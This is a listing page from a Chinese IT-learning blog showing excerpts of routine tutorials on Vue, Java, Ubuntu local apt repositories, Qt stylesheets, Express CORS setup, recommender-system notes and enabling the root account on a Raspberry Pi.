		Vue基础知识之利用v-for语句+自定义排序函数实现data内数据按照age列自动排序 v-for.html文件 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;title&gt;v-for实例&lt;/title&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;script type='text/javascript' src='../assets/js/vue.js' &gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;v-for实例&lt;/h1&gt; &lt;hr&gt; &lt;div id="app" &gt; &lt;!-- 模板的输出方式，把message变量渲染到模板里 --&gt; &lt;ul&gt; &lt;!-- v-for写到要循环的那个标签上 --&gt; &lt;li v-for='item in sortitems'&gt; {{item}} &lt;/li&gt; &lt;/ul&gt; &lt;hr&gt; &lt;ul&gt; &lt;li v-for='(student,index) in sortStudents'&gt; {{index+1}}:{{student.name}}-{{student.age}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type='text/javascript'&gt; //声明变量且实例化(生成器) var app =new Vue({ el:'#app', data:{ items:[61,6,64,22,72,43,5], students:[ {name:'Andrew Ng',age:'42'}, {name:'Jason Niu',age:'25'}, {name:'Geoffrey Hinton',age:'76'} ] }, computed:{ sortitems:function(){ // return [1,2,3,4,5,6,7]; // return this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9b3b81085d8d739db030a6bb0c8684a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7bbc2cd7e57d39b2eb924a788784725/" rel="bookmark">
			java获取端口号，不用request
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Integer port = null; MBeanServer mBeanServer = null; List&lt;MBeanServer&gt; mBeanServers = MBeanServerFactory.findMBeanServer(null); if (mBeanServers.size() &gt; 0) { for (MBeanServer _mBeanServer : mBeanServers) { mBeanServer = _mBeanServer; break; } } if (mBeanServer == null) { throw new IllegalStateException("没有发现JVM中关联的MBeanServer."); } Set&lt;ObjectName&gt; objectNames = null; try { objectNames = mBeanServer.queryNames(new ObjectName("Catalina:type=Connector,*"), null); } catch (MalformedObjectNameException e) { e.printStackTrace(); } catch (NullPointerException e) { e.printStackTrace(); } if (objectNames == null || objectNames.size() &lt;= 0) { throw new IllegalStateException("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7bbc2cd7e57d39b2eb924a788784725/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb73109bf7d05feb4365c04334a8b6d8/" rel="bookmark">
			Ubuntu 16.04 LTS制作本地源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu 16.04 LTS制作本地源 一台主机（Ubuntu 16.04）不能连外网，但是另一台笔记本可以上外网，安装的也是Ubuntu16.04。现需要将安装的包先在笔记本上下载好，然后通过U盘转移到那台不能连外网的主机上，再在那台主机上通过本地包安装，这就需要制作本地源了，平时apt-get install安装软件时，下载的deb文件都会存放在/var/cache/apt/archives/下，没有网络时就需要将这些deb制作成本地源。
#####下面给出Ubuntu 16.04 LTS本地源制作步骤：
1、在能上网的笔记本上下载好需要的包
$ sudo rm -rf /var/cache/apt/archives/* # 清空缓存目录，这一步也可以不做 $ sudo apt-get -d install &lt;包名&gt; #不安装，只下载 运行完该命令后，需要的包及依赖都会下载到 /var/cache/apt/archives目录下。
2、复制到U盘中
将下载好的包（ /var/cache/apt/archives目录下的所有文件）复制到U盘中，准备转移。如果你不想拷贝多余的包文件，你可以提前将 /var/cache/apt/archives 目录清空后再下载需要的包。
# 先在U盘中创建好一个目录archives $ sudo cp -r /var/cache/apt/archives/* /U盘/archives/ 下面转到不能上网的主机上操作
3、在主机上创建包缓存目录
$ sudo mkdir /var/archives 4、将U盘中下载好的包文件全部复制到/var/archives目录下
$ sudo cp -r /U盘/archives/* /var/archives/ 5、生成包索引文件
$ sudo touch /var/archives/Packages.gz $ sudo chmod -R 777 /var/debs/ # 这一步是为了获得文件的可写可读可执行权限，要不然后面会失败 $ sudo dpkg-scanpackages /var/archives/ /dev/null | gzip &gt; /var/archives/Packages.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb73109bf7d05feb4365c04334a8b6d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56c3f4002de4b81e3cc023b289c5ecf2/" rel="bookmark">
			使用SecureCRT进行本地文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		步骤一：打开SecureCRT工具，点击文件--&gt;连接，连接到已经配置好的服务器，并登录进去。
步骤二：点击文件--&gt;连接SFTP标签页面，进入到SFTP页面。
步骤三：实现将本地目录文件D:\HB\js\first_javascript\02_index.html上传到服务器某一目录。
1）首先使用 lcd D:\HB\js\first_javascript切换到本地待上传文件目录。
2) 然后使用 cd byw 切换到linux存取文件的目录。（ cd byw 默认是linux中root目录【/root/byw】）
3）最后使用put命令上传文件put 02_index.html
步骤四：去服务器查看上传的文档。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeabdc95a6a01c2120d9972620d43323/" rel="bookmark">
			The tomcat server configuration at /sever/tomcat v9.0 localhost-config is.......错误解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总的来说是应为Project下边的Sever文件被错误的删除，哈哈哈同时这个文件想在回收文件中找到是不容易的，如同网上介绍的方法一样我们常用的方法是，重新添加Tomcat文件
出错的界面：
错误修改：
1：
让后删除自己的Tomcat文件：
然后重新安一份，我是重新解压了一下原来的压缩包
接下来就是重新绑定eclipse与Tomcat的关系
点击Finish，
双击Tomcat V................,进行两项相关的配置：
然后启动服务就可以成功了
Sever文件是在创建web project时候创建的
对于sever文件作用的解释：
解释一：Servers是插件为你增加的工程，目的是可以配置服务器，并且不与你真正的服务器配置发生冲突，在此你可以自由配置tomcat。
默认并不是部署到你真正的tomcat的webapps，而是在此处的对应的项目的配置文件中。可以看servers里面的那个server.xml就知道了。
解释二：1.当你建立b/s架构的系统时，需要将server加到你的项目中，
2.server就是tomcat中间件，将你编写的web项目发布到tomcat中，刚开始建立文本项目是填写项目名称就有一个选择服务器，就会看到tomcat和版本号勾选。
3.运行web程序时server会把你的web项目发布到tomcat中，就可以访问了程序了。
4.server文件里有很多配置文件，例如多口配置，虚拟路径等。
解释三：可以更好管理你的项目而已，你可以不用去管这个，但是只要你运行这个项目的时候，必须把这个打开。。
总结，Servers项目即你在tomcat发布运行项目的时候，会将项目通过此处的Tomcat配置与本地的tomcat服务进行交互，它只是一个中间件。目的是各自
项目拥有各自的Tomcat，进行独立的运行，而不产生关联。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b104fd9de9f80c599540a8be4ddfbbcf/" rel="bookmark">
			LeetCode349. 两个数组的交集(java)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目:
给定两个数组，编写一个函数来计算它们的交集。
示例：
代码：
解法一 //利用集合实现 class Solution { public int[] intersection(int[] nums1, int[] nums2) { TreeSet&lt;Integer&gt; set=new TreeSet&lt;Integer&gt;(); for(Integer nums:nums1){	//将nums1的元素放入数组中 set.add(nums); } ArrayList&lt;Integer&gt; list=new ArrayList&lt;Integer&gt;();	//将交集元素放入链表存储 for(Integer nums:nums2){ if(set.contains(nums)){	//如果这个元素是交集元素 list.add(nums);	//将这个元素放入链表中 set.remove(nums);	//将集合中的这个元素删除 以防有重复元素 } } int[] res=new int[list.size()]; for(int i=0;i&lt;list.size();i++){	//将链表用数组存储 res[i]=list.get(i); } return res; } } 解法二 class Solution { public int[] intersection(int[] nums1, int[] nums2) { Set&lt;Integer&gt; hash = new HashSet&lt;&gt;(); int[] result = new int[nums1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b104fd9de9f80c599540a8be4ddfbbcf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/356a6c5fe58ffc04b82d71cdbe3938e2/" rel="bookmark">
			git pre-push hook
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		This article introduces git pre-push hook.
Problem In Lean project, we use a modified version of Google’s C++ style checker. I want to automatically run the checker over the changed files before I push commits to git repositories. This is useful because it prevents me from accidentally pushing the commits which contain style problems.
Solution: git pre-push hook Since git 1.8.2, git introduced pre-push hook which is executed before actual push operation is performed.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/356a6c5fe58ffc04b82d71cdbe3938e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd6a0a3787c153f161c39b406152ea63/" rel="bookmark">
			OHEM的pytorch代码实现细节
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		详细解读一下OHEM的实现代码：
def ohem_loss( batch_size, cls_pred, cls_target, loc_pred, loc_target, smooth_l1_sigma=1.0 ): """ Arguments: batch_size (int): number of sampled rois for bbox head training loc_pred (FloatTensor): [R, 4], location of positive rois loc_target (FloatTensor): [R, 4], location of positive rois pos_mask (FloatTensor): [R], binary mask for sampled positive rois cls_pred (FloatTensor): [R, C] cls_target (LongTensor): [R] Returns: cls_loss, loc_loss (FloatTensor) """ ohem_cls_loss = F.cross_entropy(cls_pred, cls_target, reduction='none', ignore_index=-1) ohem_loc_loss = smooth_l1_loss(loc_pred, loc_target, sigma=smooth_l1_sigma, reduce=False) #这里先暂存下正常的分类loss和回归loss loss = ohem_cls_loss + ohem_loc_loss #然后对分类和回归loss求和 sorted_ohem_loss, idx = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd6a0a3787c153f161c39b406152ea63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/544ca5ec57d5fa01e8b56a7b92f13f0e/" rel="bookmark">
			读书笔记：推荐系统实践-第二章-利用用户行为数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、用户行为数据简介 用户行为在个性化推荐系统一般会分为两种：显性反馈行为和隐性反馈行为。
如何用统一的方式表示这些所有的行为？
不同行为的不同数据集
无上下文信息的隐性反馈数据集 每一条行为记录仅仅包含用户ID和物品ID。无上下文信息的显性反馈数据集 每一条记录包含用户ID、物品ID和用户对物品的评分。有上下文信息的隐性反馈数据集 每一条记录包含用户ID、物品ID和用户对物品产生行。有上下文信息的显性反馈数据集 每一条记录包含用户ID、物品ID、用户对物品的评分和评分行为发生的时间戳。 2、用户行为分析 2.1 用户活跃度和物品流行度的分布 用户的行为数据是满足长尾分布的，下面两者都满足长尾分布
fu(k)为对k个物品产生过行为的用户数fi(k)为被k个用户产生过行为的物品数
2.2 用户活跃度和物品流行度的关系 一般认为，新用户倾向于浏览热门的物品，而老用户会之间开始浏览冷门的物品
基于用户行为数据设计的推荐算法一本称为协同过滤算法，该算法又可以分为：
基于邻域的方法（neighborhood-based） 基于用户的协同过滤算法基于物品的协同过滤算法 隐语义模型（latent factor model）基于图的随机游走算法（random walk on graph） 3、实验设计和算法测评 数据集：MovieLens研究问题：TopN推荐问题训练集与测试集：N折交叉验证测评指标 准确率 召回率覆盖率：最终的推荐列表中包含多大比例的物品新颖度：推荐列表中物品的平均流行度 在计算平均流行度时对每个物品的流行度取对数。因为物品的流行度分布满足长尾分布，取对数之中，流行度的平均值更加稳定。 4、基于邻域的算法 4.1 基于用户的协同过滤算法 基本的两个步骤 找到和目标用户兴趣相似的用户合集找到和这个集合中的用户喜欢的，且目标用户没有听说过的物品推荐给用户目标 计算相似度的两个方法： 给定用户u和用户v，令N(u)表示用户u曾经有过正反馈的物品集合，令N(v)为用户v曾经有过正反馈的物品集合。Jaccard公式
余弦相似度
计算余弦相似度的方法（降低计算复杂度版）：原有的余弦相似度计算方法是直接两两进行计算，每次计算分子和分母。这样计算和节约计算两者都为0的计算，以及分母的重复计算。
计算结果和超参 只有一个超参K，即为每个用户选取K个和他兴趣最相似的用户准确率和召回率：适合的K会影响到模型的精度，但是精度对K不是特别敏感流行度：K越大，推荐结果越热门覆盖率：K越大，推荐结果覆盖率越低 用户相似度计算的改进User-IIF 主要思想：两个用户对冷门物品采取过同样的行为更能说明兴趣的相似度所以将相似度计算改进为如下，从而惩罚了共同的热门物品的影响：
4.2 基于物品的协同过滤算法 计算步骤 计算物品之间的相似程度根据物品的相似度和用户的历史行为给用户生成推荐列表 相似度计算公式 计算公式如下，分母表示喜欢物品i的用户数，分子表示同时喜欢物品i和物品j的用户
哈利波特问题：当j是很热门的物品时，会导致Wij计算出来很大，也就是热门物品和任何物品都会有很大的相似度，为了防止这个问题对公式进行修正。
为了解决哈利波特问题，进一步可以加大分母上对热门物品的惩罚
具体计算的方法 建立用户-物品倒排表对每个用户建立一个包含他喜欢的物品的列表，将他物品列表中的物品构建单用户的共现矩阵将这些矩阵相加可以得到C矩阵，将之归一化可以得到余弦相似度矩阵
得到物品相似度以后，用下面的公式计算用户u对物品j的兴趣：这里N(u)是用户喜欢的物品的集合，S(j,K)是和物品j最相似的K个物品的集合，wji是物品j和i的相似度，rui是用户u对物品i的兴趣。（对于隐反馈数据集，如果用户u对物品i有过行为，即可令 rui=1。）该公式的含义是，和用户历史上感兴趣的物品越相似的物品，越有可能在用户的推荐列表中获得比较高的排名
效果与超参 精度：选择合适的K对获得最高精度是很重要的流行度：随着K的增加流行度会提高，但是当增加到一定程度，流行度就不会有明显的变化覆盖率：K增加会降低系统的覆盖率 用户活跃度对物品相似度的影响-ItemCF-IUF 活跃用户对物品相似度的贡献应该小于不活跃的用户，应该增加IUF（inverse user frequence）参数来修正物品相似度的计算公式
可以提升覆盖率，降低流行度 物品相似度的归一化 热门的类其类内相似度一般比较大，如果不进行归一化，就会推荐比较热门的类里面的物品，而这些物品是比较热门的。从而，降低推荐的覆盖率。
作用：增加推荐的准确度，提高推荐的覆盖率和多样性 4.3 UserCF和ItemCF的综合比较 5 隐语义模型 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/544ca5ec57d5fa01e8b56a7b92f13f0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c84be3adb63259d1162abb406bc849dd/" rel="bookmark">
			java使用代理请求https
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我本来在我本机写的代码，本机电脑是可以连外网没限制，对于https和http都可以。但是放在linux服务器上后，因为VM限制了不能访问外网，而且有ssl验证所以就一直报错，要么是连不上线上请求，要么是访问不了SSL 443端口，其实这2错一样。
package util_liyuan; import java.io.BufferedReader; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStreamWriter; import java.io.UnsupportedEncodingException; import java.net.HttpURLConnection; import java.net.InetSocketAddress; import java.net.Proxy; import java.net.Socket; import java.net.URL; import java.security.cert.CertificateException; import java.security.cert.X509Certificate; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.HttpsURLConnection; import javax.net.ssl.SSLContext; import javax.net.ssl.SSLEngine; import javax.net.ssl.SSLSession; import javax.net.ssl.TrustManager; import javax.net.ssl.X509ExtendedTrustManager; public class Tools { private static boolean proxySet = true; private static String proxyHost = "192.168.11.254"; private static int proxyPort = 8080; public static final String GET_URL = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c84be3adb63259d1162abb406bc849dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/680224c317256cb56b7ec235fb765afb/" rel="bookmark">
			【Qt开发】StyleSheet使用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 转眼七年过去了，我是一个彻底拥抱过MFC的人，记得老大的一个需求要把按钮做成圆角，并添加背景颜色，做前端html的可能认为很简单，然而放到MFC上那可真的是很...很麻烦的，自定义类继承Button ，新手估计还搞不定，怎么也有上百行代码，实在不友好，Qt诞生大大简化了这些工作，只需要使用QSS（Qt Style Sheet）就可以轻松做到，最近详细了解了QSS，做了个百度网盘的登录界面，整理好我会把源码放出来，供大家参考。
QSS语法 background-color:rgb(6, 168, 255);　背景色
color:red;　字体颜色
border-radius:5px; 边框圆角半径
border:2px solid green;　边框2像素，实现，绿色
font:10pt;　字体大小10
设置QSS方法 方法一：UI界面设置
鼠标到按钮上右键，"改变样式表"，在编辑样式表对话框中添加QSS样式。
方法二：程序添加
每一个控件都有setStyleSheet(const QString &amp;styleSheet)方法，样式字符串直接传参即可，例：
ui.pushButton1-&gt;setStyleSheet("QPushButton{background-color: white; color: rgb(100, 100, 100) ;}");
方法三：通过QSS文件添加
新建文件StyleSheet.qss文件，添加内容如下：
/*按钮静止无操作样式*/ QPushButton { background-color:rgb(255,255,255); color:rgb(6,168,255); border:2px solid rgb(6,168,255); font-size:14px; border-radius:10px; } /*鼠标悬停在按钮*/ QPushButton:hover { background-color: rgb(212,243,255); color:rgb(6,168,255); border:2px solid rgb(6,168,255); border-radius:14px; } /*鼠标按下按钮*/ QPushButton:pressed { background-color: rgb(175,232,255); color:white; border:2px solid rgb(6,168,255); border-radius:14px; } 读取配置文件设置指定按钮样式：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/680224c317256cb56b7ec235fb765afb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8380bc0a860f2e923a9c0c65145235a1/" rel="bookmark">
			Volatile与CAS的底层原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Volatile与CAS的底层原理 引言：VOLATILE是JAVA中一个极其重要关键字，它保证的内存的可见性，但是并不能够保证原子性。而CAS是采用一种无锁的方式，解决VOLATILE所不能带来的原子性等这类问题。接下来，就讲讲VOLATILE与CAS吧！
一、volatile 在讲解 Volatile关键字之前，先上个小demo!
private static volatile long longValue = 0; private void testVolatile() { Thread t1 = new Thread(() -&gt; { long val = 0; while (val &lt; 10000000L) { longValue++; val++; } }); t1.start(); Thread t2 = new Thread(() -&gt; { long val = 0; while (val &lt; 10000000L) { longValue++; val++; } }); /* try { //休眠5S，等待第一个线程跑完 Thread.sleep(5000L); } catch (InterruptedException e) { e.printStackTrace(); }*/ t2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8380bc0a860f2e923a9c0c65145235a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e78b7edd0bd9e95a1f5ec3c0dc830f5e/" rel="bookmark">
			责任链模式及其使用场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		责任链模式及其使用场景 1.责任链模式定义2. 责任链模式使用场景3. 责任链模式实现3.1 简单实现3.2 扩展实现 4. 责任链模式实战5. 总结 1.责任链模式定义 责任链模式(Iterator Pattern), 是行为型设计模式之一。这种模型结构有点类似现实生活中铁链，由一个个铁环首尾相接构成一条链，如果这种结构用在编程领域，则每个节点可以看做一个对象，每个对象有不同的处理逻辑，将一个请求从链的首端发出，沿着链的路径依次传递每个节点对象，直到有对象处理这个请求为止，我们将这样一种模式称为责任链模式。
2. 责任链模式使用场景 1.多个对象可以处理同一个请求，但具体由哪个对象处理则在运行时动态决定。
2. 在请求处理者不明确的情况下向对个对象中的一个提交一个请求。
3. 需要动态处理一组对象处理请求。
3. 责任链模式实现 3.1 简单实现 下图是简单实现的责任链模式类UML图
角色介绍
AbsHandler：抽象处理者角色，声明一个请求处理的方法，并在其中保持一个对下一个处理节点Handler对象的引用。
ConcreteHandler：具体处理者角色，对请求进行处理，如果不能处理则将该请求转发给下一个节点上的处理对象。
定义抽象Handler public abstract class AbsHandler { protected AbsHandler successor; public abstract void handleRequest(String condition); } 定义具体实现ConcreteHandler1 及ConcreteHandler2 public class ConcreteHandler1 extends AbsHandler { @Override public void handleRequest(String condition) { if(condition.equals("ConcreteHandler1")){ return; }else{ successor.handleRequest(condition); } } } public class ConcreteHandler2 extends AbsHandler { @Override public void handleRequest(String condition) { if(condition.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e78b7edd0bd9e95a1f5ec3c0dc830f5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e0151e44cc9a0a7f2dcf34a62e5b578/" rel="bookmark">
			postcss-px2rem配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先需要安装postcss-plugin-px2rem
npm install --save-dev postcss-plugin-px2rem 复制代码 可以在package.json中配置
var px2rem = require('postcss-px2rem'); module.exports = { module: { loaders: [ { test: /\.css$/, loader: "style-loader!css-loader!postcss-loader" } ] }, postcss: function() { return [px2rem({remUnit: 75})]; } } 复制代码 一般postcss建议单独配置在文件postcss.config.js中，
module.exports = { plugins: [ require('autoprefixer')({ browsers: 'last 2 versions' }), require('postcss-px2rem')({remUnit: 75}) ] } 复制代码 REM是根据根结点来计算各个子节点的值，所以根结点也要做响应式变化。定义一个utils/setRem.js
export default function setRem(baseWidth = 750) { const dpr = window.devicePixelRatio; const currentWidth = document.documentElement.clientWidth; let remSize = 0; let scale = 0; scale = currentWidth / baseWidth; remSize = baseWidth / 10; remSize = remSize * scale; document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e0151e44cc9a0a7f2dcf34a62e5b578/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9936f45adb70748437a23b820b0f8f5a/" rel="bookmark">
			Access to XMLHttpRequest at &#39;http://localhost:8080/api/user/login&#39; from origin &#39;http://localhost:808
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用nodejs+express封装自己的api，遇到跨域问题
原本我是这样写进去的：
//设置跨域访问 app.all('*', function(req, res, next) { res.header("Access-Control-Allow-Origin", "*"); res.header("Access-Control-Allow-Headers", "X-Requested-With"); res.header("Access-Control-Allow-Methods","PUT,POST,GET,DELETE,OPTIONS"); res.header("X-Powered-By",' 3.2.1') res.header("Content-Type", "application/json;charset=utf-8"); next(); }); 后来浏览器一直：
解决方式：
把上边的第二句换成：
res.header('Access-Control-Allow-Headers', 'Content-Type, Content-Length, Authorization, Accept, X-Requested-With , yourHeaderFeild'); 完整代码：
var express = require('express'); var md5 = require('js-md5'); var app = express(); var bodyParser = require('body-parser'); app.use(bodyParser.json({ limit: '1mb' })); app.use(bodyParser.urlencoded({ limit: '1mb', extended: true })); var DatabaseOperation = require('./connection'); //引用bodyParser app.use(bodyParser.json()); app.use(bodyParser.urlencoded({ extended: true })); //设置跨域请求 app.all('*', function (req, res, next) { res.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9936f45adb70748437a23b820b0f8f5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/278daaeddb98c4658157b392650385b1/" rel="bookmark">
			3，开启 树莓派 的 root 帐号 （新人向）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		树莓派开机后，默认登陆用户是pi，通过SSH或LX终端登陆的话，默认用户也是pi，虽然可以完成大部分操作了，但有时候会提示权限不够。这时候就需要树莓派的超级管理员帐号了，即 root 帐号 。
root 帐号默认是没有配置并且关闭的，得先设置密码，再解锁，才能使用。
具体操作 先使用默认的用户 pi 使用Putty，通过SSH登陆树莓派，（或者打开树莓派里运行LX终端）。
运行下面的命令，来设置 root 帐号的密码。需要输入两次！请牢记！跟之前一样，输入密码时屏幕不会有任何显示，也不会有*******，所以按了什么键，自己心里要清楚哦！ sudo passwd root
运行下面的命令，来解锁管理员帐号。（确定后不会有任何提示，没有报错就是成功了。） sudo passwd --unlock root
运行下面的命令，切换到 root 帐号。 su root
然后可以看到，当前已经是 root@raspberrypi:/home/pi# ，切换成功，开始浪吧！
TIPS：从root帐号切换回pi帐号后，再次使用上面的改密码命令来修改密码，会报错。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/237/">«</a>
	<span class="pagination__item pagination__item--current">238/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/239/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>